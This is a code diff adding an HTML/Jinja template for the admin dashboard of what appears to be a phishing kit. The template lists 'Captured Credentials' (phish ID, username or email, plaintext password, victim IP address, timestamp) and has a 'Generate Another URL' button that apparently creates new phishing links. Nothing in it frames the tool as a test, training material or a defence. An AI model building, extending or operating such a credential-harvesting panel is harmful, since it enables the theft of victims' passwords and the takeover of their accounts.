@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="/static/styles.css">
+</head>
+<body>
+  <div class="container">
+    <h2>Captured Credentials</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Phish ID</th>
+          <th>Username</th>
+          <th>Password</th>
+          <th>IP Address</th>
+          <th>Timestamp</th>
+        </tr>
+      </thead>
+      <tbody>
+      {% for entry in entries %}
+        <tr>
+          <td>{{ entry.id }}</td>
+          <td>{% if entry.username %}{{ entry.username }}{% else %}{{ entry.email }}{% endif %}</td>
+          <td>{{ entry.password }}</td>
+          <td>{{ entry.ip }}</td>
+          <td>{{ entry.timestamp }}</td>
+        </tr>
+      {% endfor %}
+      </tbody>
+    </table>
+    <br>
+    <div style="text-align: center;">
+      <button onclick="window.location.href='/generate'" class="btn-dashboard">Generate Another URL</button>
+    </div>
+  </div>
+</body>
+</html>
